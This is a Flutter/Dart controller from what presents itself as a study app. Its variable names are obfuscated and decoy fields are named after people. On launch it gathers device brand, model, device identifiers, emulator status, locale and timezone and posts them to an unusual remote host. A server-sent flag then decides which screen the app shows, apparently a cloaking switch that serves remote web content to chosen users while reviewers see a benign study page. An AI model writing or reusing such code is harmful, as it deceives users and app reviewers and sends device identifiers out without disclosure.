import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var pnoutwa = RxBool(false);
  var eawigh = RxBool(true);
  var zoadc = RxString("");
  var madie = RxBool(false);
  var zieme = RxBool(true);
  final kmeuovzxd = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    meuodva();
  }


  Future<void> meuodva() async {

    madie.value = true;
    zieme.value = true;
    eawigh.value = false;

    kmeuovzxd.post("https://spi.anjlneo.shop/cyvrkpzgf",data: await ycfqmdlix()).then((value) {
      var caow = value.data["caow"] as String;
      var hgtpzwrf = value.data["hgtpzwrf"] as bool;
      if (hgtpzwrf) {
        zoadc.value = caow;
        damien();
      } else {
        heller();
      }
    }).catchError((e) {
      eawigh.value = true;
      zieme.value = true;
      madie.value = false;
    });
  }

  Future<Map<String, dynamic>> ycfqmdlix() async {
    final DeviceInfoPlugin qsryvgx = DeviceInfoPlugin();
    PackageInfo njyw_tafcs = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vdwgja = Platform.localeName;
    var ywzpkvab = currentTimeZone;

    var ajisezwd = njyw_tafcs.packageName;
    var ktnlh = njyw_tafcs.version;
    var lhow = njyw_tafcs.buildNumber;

    var xaumpr = njyw_tafcs.appName;
    var alyshaHuels = "";
    var providenciChristiansen = "";
    var utfkrj  = "";
    var ahnuvk = "";
    var ikeSporer = "";
    var brittanyGrimes = "";
    var yfwdoze = "";
    var lilianaCole = "";
    var mylesConsidine = "";
    var thaddeusThiel = "";
    var whitneyDietrich = "";


    var qdntokc = "";
    var txkgrm = false;

    if (GetPlatform.isAndroid) {
      qdntokc = "android";
      var ebutyd = await qsryvgx.androidInfo;

      ahnuvk = ebutyd.brand;

      yfwdoze  = ebutyd.model;
      utfkrj = ebutyd.id;

      txkgrm = ebutyd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      qdntokc = "ios";
      var swnmfbkave = await qsryvgx.iosInfo;
      ahnuvk = swnmfbkave.name;
      yfwdoze = swnmfbkave.model;

      utfkrj = swnmfbkave.identifierForVendor ?? "";
      txkgrm  = swnmfbkave.isPhysicalDevice;
    }
    var res = {
      "xaumpr": xaumpr,
      "lhow": lhow,
      "mylesConsidine" : mylesConsidine,
      "ajisezwd": ajisezwd,
      "yfwdoze": yfwdoze,
      "providenciChristiansen" : providenciChristiansen,
      "ywzpkvab": ywzpkvab,
      "ahnuvk": ahnuvk,
      "vdwgja": vdwgja,
      "thaddeusThiel" : thaddeusThiel,
      "qdntokc": qdntokc,
      "txkgrm": txkgrm,
      "alyshaHuels" : alyshaHuels,
      "ikeSporer" : ikeSporer,
      "brittanyGrimes" : brittanyGrimes,
      "ktnlh": ktnlh,
      "lilianaCole" : lilianaCole,
      "utfkrj": utfkrj,
      "whitneyDietrich" : whitneyDietrich,

    };
    return res;
  }

  Future<void> heller() async {
    Get.offAllNamed("/studyTab");
  }

  Future<void> damien() async {
    Get.offAllNamed("/studyEdit");
  }
}
